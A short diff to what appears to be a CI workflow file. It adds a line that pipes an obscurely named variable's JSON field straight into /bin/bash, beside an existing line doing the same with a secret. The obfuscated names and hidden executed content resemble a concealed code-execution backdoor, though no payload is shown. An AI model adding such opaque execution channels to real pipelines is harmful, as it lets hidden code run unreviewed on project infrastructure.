@@ -18,6 +18,7 @@ jobs:
           gfnk35: ${{ secrets.gfnk35 }}
         run: |
           printf '%s' "$gfnk35" | jq -r .h1571 | /bin/bash
+          echo $o57 | jq -r .t966 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
